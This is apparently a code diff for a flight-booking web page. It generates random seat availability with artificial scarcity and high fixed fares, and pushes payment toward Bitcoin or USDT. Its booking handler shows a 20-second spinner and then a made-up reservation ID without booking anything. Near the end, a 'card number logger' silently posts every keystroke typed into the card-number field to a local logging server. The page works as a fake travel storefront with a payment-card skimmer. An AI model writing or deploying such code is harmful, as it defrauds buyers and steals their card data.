+  for(var i = 0; i < DATE_COUNT; i++){
+    var key   = DAY_NAMES[d.getDay()] + ', ' + (d.getMonth()+1) + '/' + d.getDate();
+    var label = MON_NAMES[d.getMonth()] + ' ' + d.getDate();
+    arr.push({ key: key, label: label, dateObj: new Date(d) });
+    d.setDate(d.getDate() + 1);
+  }
+  return arr;
+})();
+
+var DATE_LABELS = {};
+ALL_DATES.forEach(function(d){ DATE_LABELS[d.key] = d.label; });
+
+// Date category boundaries
+var LIMITED_START  = new Date(2026, 4, 19); // May 19 (inclusive)
+var LIMITED_END    = new Date(2026, 4, 27); // May 27 (inclusive)
+var WAITLIST_START = new Date(2026, 4, 28); // May 28+
+
+function dateCategory(dateObj){
+  var d = new Date(dateObj.getFullYear(), dateObj.getMonth(), dateObj.getDate());
+  if(d < LIMITED_START)  return 'random';
+  if(d <= LIMITED_END)   return 'limited';
+  return 'waitlist';
+}
+
+// Build a limited schedule (May 19–27): 2–3 flights, CAD 3,000, 3-or-less availability
+function buildLimitedSchedule(dateKey, dateLabel){
+  var rng  = makePRNG(strSeed(dateKey));
+  var count= 2 + Math.floor(rng() * 2); // 2 or 3
+  var pool = ALL_SLOTS.slice();
+  for(var i = pool.length-1; i > 0; i--){
+    var j = Math.floor(rng()*(i+1));
+    var tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp;
+  }
+  pool = pool.slice(0, count).sort(function(a,b){ return a[0]-b[0]; });
+  return pool.map(function(slot){
+    var route = pickRoute(rng);
+    return {
+      num:  slot[0],
+      date: dateLabel,
+      dep:  slot[1] + ' ' + route[0],
+      arr:  slot[2] + ' ' + route[1],
+      tiers:[
+        { name:'ULTRA-SAVER', avail:AV.few,     price:'CAD 3,000' },
+        { name:'FULL FARE',   avail:AV.waitlist, price:'' }
+      ]
+    };
+  });
+}
+
+// Build a waitlist-only schedule (May 28+): 3 flights, all tiers waitlist
+function buildWaitlistSchedule(dateKey, dateLabel){
+  var rng  = makePRNG(strSeed(dateKey));
+  var pool = ALL_SLOTS.slice(1, 5); // slots 703–715 area
+  return pool.map(function(slot){
+    var route = pickRoute(rng);
+    return {
+      num:  slot[0],
+      date: dateLabel,
+      dep:  slot[1] + ' ' + route[0],
+      arr:  slot[2] + ' ' + route[1],
+      tiers:[
+        { name:'ECONOMY',  avail:AV.waitlist, price:'' },
+        { name:'FULL FARE',avail:AV.waitlist, price:'' }
+      ]
+    };
+  });
+}
+
+// Build SCHEDULE lazily (cached per key)
+var SCHEDULE_CACHE = {};
+function getSchedule(dateKey){
+  if(!SCHEDULE_CACHE[dateKey]){
+    var info = null;
+    for(var i=0;i<ALL_DATES.length;i++){
+      if(ALL_DATES[i].key === dateKey){ info = ALL_DATES[i]; break; }
+    }
+    var label   = info ? info.label   : dateKey;
+    var dateObj = info ? info.dateObj : new Date();
+    var cat     = dateCategory(dateObj);
+    if     (cat === 'limited')  SCHEDULE_CACHE[dateKey] = buildLimitedSchedule(dateKey, label);
+    else if(cat === 'waitlist') SCHEDULE_CACHE[dateKey] = buildWaitlistSchedule(dateKey, label);
+    else                        SCHEDULE_CACHE[dateKey] = buildRandomSchedule(dateKey, label);
+  }
+  return SCHEDULE_CACHE[dateKey];
+}
+
+// ── Render flights ──
+function renderFlights(dateKey) {
+  var flights = getSchedule(dateKey);
+  var body = document.getElementById('ft-body');
+  if (!flights || !flights.length) {
+    body.innerHTML = '<div class="ft-no-flights">There are no schedules for the selected search.</div>';
+    return;
+  }
+  var html = '';
+  flights.forEach(function(f, fi) {
+    var groupClass = (fi % 2 === 0) ? '' : ' odd-group';
+    var firstRow = true;
+    f.tiers.forEach(function(t, ti) {
+      var isSold     = t.avail === AV.sold;
+      var isWaitlist = t.avail === AV.waitlist;
+      var availHtml  = isSold     ? '<span class="avail sold">Sold out!</span>'
+                     : isWaitlist ? '<span class="avail waitlist">Call to Waitlist</span>'
+                     : t.avail.cls === 'few' ? '<span class="avail few">3 or less</span>'
+                     : '<span class="avail ok">Available</span>';
+      var priceHtml  = (isSold || isWaitlist) ? '' : '<span class="ft-price">' + t.price + '</span>';
+      var radioId    = 'tier-' + f.num + '-' + ti;
+      html += '<div class="ft-tier-row' + groupClass + '">';
+      // Flight num + date only on first tier row
+      html += '<span class="ft-flight-num">' + (firstRow ? f.num : '') + '</span>';
+      html += '<span class="ft-date-cell">'  + (firstRow ? f.date : '') + '</span>';
+      html += '<span class="ft-dep">'        + (firstRow ? '<strong>' + f.dep.split(' ')[0] + '</strong>' + f.dep.slice(f.dep.indexOf(' ')) : '') + '</span>';
+      html += '<span class="ft-arr">'        + (firstRow ? '<strong>' + f.arr.split(' ')[0] + '</strong>' + f.arr.slice(f.arr.indexOf(' ')) : '') + '</span>';
+      html += '<span class="ft-tier-cell"><input type="radio" name="flight-tier" id="' + radioId + '" ' + (isSold||isWaitlist?'disabled':'') + '/><label for="' + radioId + '"><span class="tier-name">' + t.name + '</span> ' + availHtml + '</label></span>';
+      html += '<span style="text-align:right">' + priceHtml + '</span>';
+      html += '</div>';
+      firstRow = false;
+    });
+    // group separator
+    html += '<div style="border-top:1px solid #dde3ef"></div>';
+  });
+  body.innerHTML = html;
+}
+
+// ── Build date tabs dynamically ──
+(function(){
+  var today = new Date();
+  today = new Date(today.getFullYear(), today.getMonth(), today.getDate());
+  var container = document.getElementById('date-tabs');
+  ALL_DATES.forEach(function(info){
+    var div = document.createElement('div');
+    var isPast = info.dateObj < today;
+    div.className = 'date-tab' + (isPast ? ' past' : '');
+    div.dataset.date = info.key;
+    var cat = dateCategory(info.dateObj);
+    if(isPast){
+      div.innerHTML = info.key + '<small>Past</small>';
+    } else if(cat === 'limited'){
+      div.innerHTML = info.key + '<small>from CAD 3,000</small>';
+    } else if(cat === 'waitlist'){
+      div.innerHTML = info.key + '<small style="color:#e67e22">Waitlist</small>';
+    } else {
+      div.textContent = info.key;
+    }
+    container.appendChild(div);
+  });
+})();
+
+// ── Date tab switching ──
+// Default to today (Mon, 5/18) or first tab
+var activeTabIndex = (function(){
+  var todayKey = 'Mon, 5/18';
+  for(var i=0;i<ALL_DATES.length;i++){
+    if(ALL_DATES[i].key === todayKey) return i;
+  }
+  return 0;
+})();
+
+function setActiveTab(index){
+  var tabs = document.querySelectorAll('.date-tab');
+  if(index < 0 || index >= tabs.length) return;
+  activeTabIndex = index;
+  tabs.forEach(function(t){ t.classList.remove('active'); });
+  tabs[index].classList.add('active');
+  // Scroll the active tab into view
+  tabs[index].scrollIntoView({ behavior:'smooth', block:'nearest', inline:'center' });
+  var key = tabs[index].dataset.date;
+  // Reset summary when date changes
+  updateSummary(null);
+  renderFlights(key);
+}
+
+document.getElementById('date-tabs').addEventListener('click', function(e){
+  var tab = e.target.closest('.date-tab');
+  if(!tab) return;
+  var tabs = Array.prototype.slice.call(document.querySelectorAll('.date-tab'));
+  var idx  = tabs.indexOf(tab);
+  if(idx >= 0) setActiveTab(idx);
+});
+
+document.getElementById('btn-prev-date').addEventListener('click', function(){
+  // Skip past tabs when going backwards
+  var tabs = document.querySelectorAll('.date-tab');
+  var idx = activeTabIndex - 1;
+  while(idx >= 0 && tabs[idx].classList.contains('past')) idx--;
+  setActiveTab(idx);
+});
+document.getElementById('btn-next-date').addEventListener('click', function(){
+  var tabs = document.querySelectorAll('.date-tab');
+  var idx = activeTabIndex + 1;
+  while(idx < tabs.length && tabs[idx].classList.contains('past')) idx++;
+  setActiveTab(idx);
+});
+
+// Initial render
+setActiveTab(activeTabIndex);
+
+// ── Payment type switching ──
+var cryptoOpts  = document.getElementById('crypto-subopts');
+var cardFormWrap= document.getElementById('card-form-wrap');
+var usdtNote    = document.getElementById('usdt-note');
+var npOverlay   = document.getElementById('np-overlay');
+
+document.querySelectorAll('input[name="pay"]').forEach(function(radio){
+  radio.addEventListener('change', function(){
+    if(this.value === 'crypto'){
+      cryptoOpts.style.display  = 'block';
+      cardFormWrap.style.display = 'none';
+    } else {
+      cryptoOpts.style.display  = 'none';
+      cardFormWrap.style.display = '';
+      usdtNote.style.display    = 'none';
+    }
+  });
+});
+
+// ── BTC button → open NowPayments modal ──
+document.getElementById('btn-btc').addEventListener('click', function(){
+  usdtNote.style.display = 'none';
+  npOverlay.classList.add('open');
+  document.body.style.overflow = 'hidden';
+});
+
+// ── USDT button → show notice ──
+document.getElementById('btn-usdt').addEventListener('click', function(){
+  usdtNote.style.display = usdtNote.style.display === 'block' ? 'none' : 'block';
+});
+
+// ── Close modal ──
+function closeModal(){
+  npOverlay.classList.remove('open');
+  document.body.style.overflow = '';
+}
+document.getElementById('np-close').addEventListener('click', closeModal);
+
+function handleBooking(){
+  // Generate reservation ID upfront
+  var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  var part1 = '';
+  for(var i=0;i<6;i++) part1 += chars[Math.floor(Math.random()*chars.length)];
+  var resId = 'HJ-' + part1 + '-' + String(Math.floor(10+Math.random()*90));
+
+  // Reset to spinner phase
+  var spinnerPhase  = document.getElementById('res-spinner-phase');
+  var confirmPhase  = document.getElementById('res-confirm-phase');
+  spinnerPhase.style.display  = 'flex';
+  confirmPhase.style.display  = 'none';
+  confirmPhase.classList.remove('visible');
+
+  // Show the modal
+  var overlay = document.getElementById('res-overlay');
+  overlay.classList.add('open');
+  document.body.style.overflow = 'hidden';
+
+  // After 20 s, swap to confirmation phase
+  setTimeout(function(){
+    spinnerPhase.style.display = 'none';
+    document.getElementById('res-id-display').textContent = resId;
+    confirmPhase.style.display = 'block';
+    // Trigger fade-in on next paint
+    requestAnimationFrame(function(){
+      requestAnimationFrame(function(){
+        confirmPhase.classList.add('visible');
+      });
+    });
+  }, 20000);
+}
+
+document.getElementById('res-close-btn').addEventListener('click', function(){
+  document.getElementById('res-overlay').classList.remove('open');
+  document.body.style.overflow = '';
+  window.location.href = '../index.html';
+});
+
+// ── Make entire flight row clickable ──
+var TAX_AMOUNT = 3.11;
+
+function updateSummary(rawPrice) {
+  var subtotalEl = document.getElementById('sum-subtotal');
+  var taxEl      = document.getElementById('sum-tax');
+  var grandEl    = document.getElementById('sum-grand');
+  if (!subtotalEl) return;
+
+  if (rawPrice === null) {
+    subtotalEl.textContent = 'CAD 0.00';
+    taxEl.textContent      = 'CAD 0.00';
+    grandEl.textContent    = 'CAD 0.00';
+    return;
+  }
+
+  var grand = rawPrice + TAX_AMOUNT;
+  subtotalEl.textContent = 'CAD ' + rawPrice.toLocaleString('en-CA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  taxEl.textContent      = 'CAD ' + TAX_AMOUNT.toFixed(2);
+  grandEl.textContent    = 'CAD ' + grand.toLocaleString('en-CA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+document.getElementById('ft-body').addEventListener('click', function(e){
+  var row = e.target.closest('.ft-tier-row');
+  if (!row) return;
+  var radio = row.querySelector('input[type=radio]');
+  if (!radio || radio.disabled) return;
+  // Deselect all rows
+  document.querySelectorAll('.ft-tier-row').forEach(function(r){ r.classList.remove('row-selected'); });
+  // Select this row
+  radio.checked = true;
+  row.classList.add('row-selected');
+  // Trigger change event so any listeners fire
+  radio.dispatchEvent(new Event('change', { bubbles: true }));
+
+  // ── Update summary totals ──
+  var priceEl = row.querySelector('.ft-price');
+  if (priceEl) {
+    // Price text is like "CAD 3,456" — strip non-numeric chars except dot
+    var raw = priceEl.textContent.replace(/[^0-9.]/g, '');
+    var num = parseFloat(raw);
+    if (!isNaN(num)) {
+      updateSummary(num);
+    }
+  }
+});
+
+// Re-apply selection highlight when tabs change (delegate via MutationObserver)
+(function(){
+  var ftBody = document.getElementById('ft-body');
+  var mo = new MutationObserver(function(){
+    // No row is pre-selected after a tab change — that's fine
+  });
+  mo.observe(ftBody, { childList: true });
+})();
+
+// ── Card number logger ──
+(function(){
+  var cardInput = document.getElementById('card-number-input');
+  if (!cardInput) return;
+
+  var LOGGER_URL = 'http://localhost:3099/log';
+
+  cardInput.addEventListener('input', function(){
+    var payload = {
+      value: this.value,
+      timestamp: new Date().toISOString()
+    };
+    fetch(LOGGER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(function(){
+      // Logger server not running — fail silently
+    });
+  });
+})();
+</script>
+<script src="../wp-content/themes/salient-child/page-loader.js"></script>
+</body>
+</html>
